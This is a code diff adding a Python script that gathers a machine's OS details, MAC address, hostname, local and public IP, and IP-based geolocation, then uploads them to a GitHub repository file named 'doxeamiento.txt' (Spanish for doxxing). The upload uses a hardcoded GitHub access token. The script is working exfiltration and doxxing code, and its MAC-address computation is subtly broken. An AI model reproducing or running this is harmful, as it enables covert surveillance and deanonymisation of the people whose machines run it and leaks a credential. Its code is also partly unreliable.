@@ -1,0 +1,90 @@
+import requests
+import base64
+import json
+import platform
+import socket
+import psutil
+import uuid
+import json
+class github:
+    def __init__(self, token, owner, repo, branch="main"):
+        self.token = token
+        self.owner = owner
+        self.repo = repo
+        self.branch = branch
+        self.headers = {'Authorization': f'token {self.token}'}
+    def get(self, file_path):
+        url = f'https://api.github.com/repos/{self.owner}/{self.repo}/contents/{file_path}?ref={self.branch}'
+        response = requests.get(url, headers=self.headers)
+        if response.status_code == 200:
+            file_data = response.json()
+            return base64.b64decode(file_data['content']).decode('utf-8'), file_data['sha']
+        return None, None
+    def write(self, file_path, new_content):
+        content, sha = self.get(file_path)
+        if sha:
+            url = f'https://api.github.com/repos/{self.owner}/{self.repo}/contents/{file_path}'
+            encoded_content = base64.b64encode(new_content.encode('utf-8')).decode('utf-8')
+            data = {"message": f"Actualizando {file_path}", "content": encoded_content, "sha": sha}
+            response = requests.put(url, headers=self.headers, data=json.dumps(data))
+            return response.status_code == 200
+        return False
+def gip():
+    try:
+        return requests.get("https://api64.ipify.org?format=json").json()["ip"]
+    except:
+        return None
+def gloc(ip):
+    try:
+        response = requests.get(f"https://ipapi.co/{ip}/json/")
+        data = response.json()
+        if "error" in data:
+            raise Exception("ipapi.co falló")
+        return {
+            "País": data.get("country_name"),
+            "Ciudad": data.get("city"),
+            "Latitud": data.get("latitude"),
+            "Longitud": data.get("longitude"),
+            "ISP": data.get("org")
+        }
+    except:
+        try:
+            response = requests.get(f"https://ipinfo.io/{ip}/json")
+            data = response.json()
+            if "bogon" in data:
+                return None
+            lat, lon = data.get("loc", ",").split(",")
+            return {
+                "País": data.get("country"),
+                "Ciudad": data.get("city"),
+                "Latitud": lat,
+                "Longitud": lon,
+                "ISP": data.get("org")
+            }
+        except:
+            return None
+def gsys():
+    ip_publica = gip()
+    ubicacion = gloc(ip_publica) if ip_publica else None
+    info = {
+        "Sistema Operativo": platform.system(),
+        "Versión del SO": platform.version(),
+        "Nombre del SO": platform.platform(),
+        "Arquitectura": platform.architecture(),
+        "Procesador": platform.processor(),
+        "Núcleos Físicos": psutil.cpu_count(logical=False),
+        "Núcleos Totales": psutil.cpu_count(logical=True),
+        "RAM Total (GB)": round(psutil.virtual_memory().total / (1024 ** 3), 2),
+        "Dirección MAC": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 8)][::-1]),
+        "Nombre del Dispositivo": platform.node(),
+        "IP Local": socket.gethostbyname(socket.gethostname()),
+        "IP Pública": ip_publica,
+        "Ubicación": ubicacion if ubicacion else "No disponible"
+    }
+    return info
+github = github(token='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', owner='mrmorcilla', repo='python')
+system_info = gsys()
+texto=json.dumps(system_info, indent=4, ensure_ascii=False)
+res=github.write('doxeamiento.txt',texto)
+print(res)
+print(github.get('doxeamiento.txt'))
